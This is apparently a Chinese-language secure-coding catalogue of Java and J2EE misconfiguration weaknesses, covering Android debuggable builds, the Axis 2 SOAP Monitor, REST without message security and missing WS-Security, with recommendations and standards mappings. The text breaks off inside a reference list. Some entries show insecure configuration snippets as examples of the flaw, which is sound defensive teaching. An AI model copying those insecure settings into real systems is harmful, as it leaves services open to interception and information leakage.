<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private URL url;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public final URL url = URL_CONST;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-139"><a href="#REFERENCES-139" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] MUTABLE-8: Define wrapper methods around modifiable internal state Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 493</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>这部分包含源代码以外的所有内容，但对于即将创建的产品的安全仍至关重要。因为此分类中涵盖的问题与源代码没有直接关系，所以我们将其与其他分类分开。</p>
<p>Android Misconfiguration: Debug Information</p>
<p>Axis 2 Misconfiguration: Debug Information</p>
<p>Axis 2 Misconfiguration: Insecure Message Security</p>
<p>Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</p>
<p>Axis 2 Service Provider Misconfiguration: Missing Inbound Encryption</p>
<p>Axis 2 Service Provider Misconfiguration: Missing Inbound Signature</p>
<p>Axis 2 Service Provider Misconfiguration: Missing Inbound Timestamp</p>
<p>Axis 2 Service Provider Misconfiguration: Missing Outbound Encryption</p>
<p>Axis 2 Service Provider Misconfiguration: Missing Outbound Signature</p>
<p>Axis 2 Service Provider Misconfiguration: Missing Outbound Timestamp</p>
<p>Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</p>
<p>Axis 2 Service Provider Misconfiguration: Unsigned Inbound Timestamp</p>
<p>Axis 2 Service Provider Misconfiguration: Unsigned Outbound Timestamp</p>
<p>Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</p>
<p>Axis 2 Service Provider Misconfiguration: Weak Token</p>
<p>Axis 2 Service Requester Misconfiguration: Inbound WS-Security Not Enabled</p>
<p>Axis 2 Service Requester Misconfiguration: Missing Inbound Encryption</p>
<p>Axis 2 Service Requester Misconfiguration: Missing Inbound Signature</p>
<p>Axis 2 Service Requester Misconfiguration: Missing Inbound Timestamp</p>
<p>Axis 2 Service Requester Misconfiguration: Missing Outbound Encryption</p>
<p>Axis 2 Service Requester Misconfiguration: Missing Outbound Signature</p>
<p>Axis 2 Service Requester Misconfiguration: Missing Outbound Timestamp</p>
<p>Axis 2 Service Requester Misconfiguration: Outbound WS-Security Not Enabled</p>
<p>Axis 2 Service Requester Misconfiguration: Plain Text Password</p>
<p>Axis 2 Service Requester Misconfiguration: Unsigned Inbound Timestamp</p>
<p>Axis 2 Service Requester Misconfiguration: Unsigned Outbound Timestamp</p>
<p>Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</p>
<p>Axis 2 Service Requester Misconfiguration: Weak Token</p>
<p>Axis Misconfiguration: Debug Information</p>
<p>Axis Misconfiguration: Service Enumeration</p>
<p>Axis Service Provider Misconfiguration: Plain Text Password</p>
<p>Axis Service Provider Misconfiguration: Weak Token</p>
<p>Axis Service Requester Misconfiguration: Plain Text Password</p>
<p>Axis Service Requester Misconfiguration: Weak Token</p>
<p>Build Misconfiguration: Dynamic Dependency Version Usage</p>
<p>Build Misconfiguration: External Ant Dependency Repository</p>
<p>Build Misconfiguration: External Ivy Dependency Repository</p>
<p>Build Misconfiguration: External Maven Dependency Repository</p>
<p>ClassLoader Manipulation: Struts 1</p>
<p>Flex Misconfiguration: Debug Information</p>
<p>J2EE Misconfiguration: Cookies Disabled</p>
<p>J2EE Misconfiguration: Debug Information</p>
<p>J2EE Misconfiguration: Direct JSP Access</p>
<p>J2EE Misconfiguration: Duplicate Security Role</p>
<p>J2EE Misconfiguration: Duplicate Servlet Mapping</p>
<p>J2EE Misconfiguration: Excessive Servlet Mappings</p>
<p>J2EE Misconfiguration: Excessive Session Timeout</p>
<p>J2EE Misconfiguration: Incomplete Error Handling</p>
<p>J2EE Misconfiguration: Incomplete Error Handling - (404)</p>
<p>J2EE Misconfiguration: Incomplete Error Handling - (500)</p>
<p>J2EE Misconfiguration: Incomplete Error Handling - (throwable)</p>
<p>J2EE Misconfiguration: Insufficient Session ID Length</p>
<p>J2EE Misconfiguration: Invalid Servlet Name</p>
<p>J2EE Misconfiguration: Missing Authentication Method</p>
<p>J2EE Misconfiguration: Missing Data Transport Constraint</p>
<p>J2EE Misconfiguration: Missing Error Handling</p>
<p>J2EE Misconfiguration: Missing Filter Definition</p>
<p>J2EE Misconfiguration: Missing Security Role</p>
<p>J2EE Misconfiguration: Missing Servlet Mapping</p>
<p>J2EE Misconfiguration: Unsafe Bean Declaration</p>
<p>J2EE Misconfiguration: Weak Access Permissions</p>
<p>Password Management: Empty Password in Configuration File</p>
<p>Password Management: Password in Configuration File</p>
<p>Struts Misconfiguration: Duplicate Form Bean</p>
<p>Struts Misconfiguration: Invalid Path</p>
<p>Struts Misconfiguration: Missing Action Input</p>
<p>Struts Misconfiguration: Missing Exception Type</p>
<p>Struts Misconfiguration: Missing Form Bean</p>
<p>Struts Misconfiguration: Missing Form Bean Name</p>
<p>Struts Misconfiguration: Missing Form Bean Type</p>
<p>Struts Misconfiguration: Missing Form Property Type</p>
<p>Struts Misconfiguration: Missing Forward Name</p>
<p>Struts Misconfiguration: Missing Forward Path</p>
<p>WebSphere Misconfiguration: Missing Nonce</p>
<p>WebSphere Misconfiguration: Servlets Served By Class Name</p>
<p>WebSphere Service Provider Misconfiguration: Inbound WS-Security Not Enabled</p>
<p>WebSphere Service Provider Misconfiguration: Missing Inbound Encryption</p>
<p>WebSphere Service Provider Misconfiguration: Missing Inbound Signature</p>
<p>WebSphere Service Provider Misconfiguration: Missing Inbound Timestamp</p>
<p>WebSphere Service Provider Misconfiguration: Missing Outbound Encryption</p>
<p>WebSphere Service Provider Misconfiguration: Missing Outbound Signature</p>
<p>WebSphere Service Provider Misconfiguration: Missing Outbound Timestamp</p>
<p>WebSphere Service Provider Misconfiguration: Missing Timestamp Expiration</p>
<p>WebSphere Service Provider Misconfiguration: Outbound WS-Security Not Enabled</p>
<p>WebSphere Service Provider Misconfiguration: Unsigned Inbound Timestamp</p>
<p>WebSphere Service Provider Misconfiguration: Unsigned Outbound Timestamp</p>
<p>WebSphere Service Provider Misconfiguration: Weak Token</p>
<p>WebSphere Service Requester Misconfiguration: Inbound WS-Security Not Enabled</p>
<p>WebSphere Service Requester Misconfiguration: Missing Inbound Encryption</p>
<p>WebSphere Service Requester Misconfiguration: Missing Inbound Signature</p>
<p>WebSphere Service Requester Misconfiguration: Missing Inbound Timestamp</p>
<p>WebSphere Service Requester Misconfiguration: Missing Outbound Encryption</p>
<p>WebSphere Service Requester Misconfiguration: Missing Outbound Signature</p>
<p>WebSphere Service Requester Misconfiguration: Missing Outbound Timestamp</p>
<p>WebSphere Service Requester Misconfiguration: Missing Timestamp Expiration</p>
<p>WebSphere Service Requester Misconfiguration: Outbound WS-Security Not Enabled</p>
<p>WebSphere Service Requester Misconfiguration: Unsigned Inbound Timestamp</p>
<p>WebSphere Service Requester Misconfiguration: Unsigned Outbound Timestamp</p>
<p>WebSphere Service Requester Misconfiguration: Weak Token</p>
<p>Weblogic Misconfiguration: Missing Timestamp</p>
<p>Weblogic Misconfiguration: Weak Token</p>
<h4 id="Android-Misconfiguration-Debug-Information"><a href="#Android-Misconfiguration-Debug-Information" class="headerlink" title="Android Misconfiguration: Debug Information"></a>Android Misconfiguration: Debug Information</h4><h5 id="ABSTRACT-141"><a href="#ABSTRACT-141" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试信息可帮助攻击者了解系统和制定攻击计划。</p>
<h5 id="EXPLANATION-142"><a href="#EXPLANATION-142" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通过对 Android 应用程序的配置，系统可以生成调试二进制码。这些二进制码提供了详细的调试信息，它们不能用在生产环境中。<code>&lt;application&gt;</code> 标签的 debuggable 属性定义了已编译的二进制码是否应包含调试信息。</p>
<p>应用程序可使用调试二进制码为用户提供尽可能多的有关自身的信息。调试二进制码只能用于开发或者测试环境中，如果它们被部署到生产环境中，将会对安全造成危险。攻击者可以利用他们从调试输出中获得的其他信息，对应用程序所用的框架、数据库或其他资源发动攻击。</p>
<h5 id="RECOMMENDATIONS-141"><a href="#RECOMMENDATIONS-141" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终在禁用调试程序的情况下编译生产二进制码。这可以通过在您的应用程序配置文件中将 <code>&lt;application&gt;</code> 标签的 debuggable 属性设为 false 来实现，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest&gt;</span><br><span class="line"></span><br><span class="line">	&lt;application android:debuggable=&quot;false&quot;&gt;</span><br><span class="line"></span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">	&lt;/application&gt;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
<p>要创建一个安全的应用程序，必须将 debuggable 属性设置为 false。但重要的一点是，您的应用程序不会通过其他方式泄漏重要的系统信息。请确保您的代码不会向攻击者泄露可能用到的系统信息。</p>
<h5 id="REFERENCES-140"><a href="#REFERENCES-140" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JavaDoc for Android Android</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 11</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M10 Lack of Binary Protections</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II, APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II, APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II, APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II, APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II, APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II, APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II, APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Axis-2-Misconfiguration-Debug-Information"><a href="#Axis-2-Misconfiguration-Debug-Information" class="headerlink" title="Axis 2 Misconfiguration: Debug Information"></a>Axis 2 Misconfiguration: Debug Information</h4><h5 id="ABSTRACT-142"><a href="#ABSTRACT-142" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>借助 SOAP Monitor 模块，攻击者可截取 SOAP 信息流。</p>
<h5 id="EXPLANATION-143"><a href="#EXPLANATION-143" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Apache Axis 2 为开发人员提供了可通过 Java applet 监视输入和输出 SOAP 消息的实用程序。SOAP Monitor 将显示用于调用 Web 服务的所有 SOAP 消息。攻击者可使用该实用程序截取 Web 服务与其客户端之间的信息流。</p>
<h5 id="RECOMMENDATIONS-142"><a href="#RECOMMENDATIONS-142" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>从配置文件中删除对 SOAP Monitor 的引用，便可禁用 SOAP Monitor。具体来说，应确保 web.xml 不包含 servlet 或 servlet 到 SOAP Monitor 服务的映射。另外，还应确保 axis2.xml 中没有类似 <code>&lt;module ref=“soapmonitor”/&gt;</code>的引用</p>
<h5 id="REFERENCES-141"><a href="#REFERENCES-141" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Using the SOAP Monitor Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 215</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Axis-2-Misconfiguration-Insecure-Message-Security"><a href="#Axis-2-Misconfiguration-Insecure-Message-Security" class="headerlink" title="Axis 2 Misconfiguration: Insecure Message Security"></a>Axis 2 Misconfiguration: Insecure Message Security</h4><h5 id="ABSTRACT-143"><a href="#ABSTRACT-143" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Apache Axis 2 已配置为使用 REST，而 REST 没有消息安全标准。</p>
<h5 id="EXPLANATION-144"><a href="#EXPLANATION-144" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。REST 自身不包含任何安全机制，因此它依靠传输层来保证消息的完整性和保密性。</p>
<p>下列配置可启用 REST：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;disableREST&quot; locked=&quot;true&quot;&gt;false&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-143"><a href="#RECOMMENDATIONS-143" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 Apache Axis 2 随附的 WS-Security 模块来保证消息的安全。WS-Security 是 SOAP 的扩展功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。WS-Security 可移除传输安全性 dependency，将其置于消息中。</p>
<p>下列配置可禁用 REST：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;disableREST&quot; locked=&quot;true&quot;&gt;true&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-142"><a href="#REFERENCES-142" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Axis2 Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled"><a href="#Axis-2-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled"></a>Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-144"><a href="#ABSTRACT-144" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不要求 WS-Security 的服务提供程序，可能无法保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-145"><a href="#EXPLANATION-145" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的增强功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并保护消息的安全。</p>
<p>若 Apache Axis 2 配置文件中缺少 InflowSecurity 参数，则表明未启用输入消息的安全性。</p>
<h5 id="RECOMMENDATIONS-144"><a href="#RECOMMENDATIONS-144" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的请求使用 WS-Security。</p>
<p>此配置应包含 InflowSecurity 参数，如下例所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-143"><a href="#REFERENCES-143" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
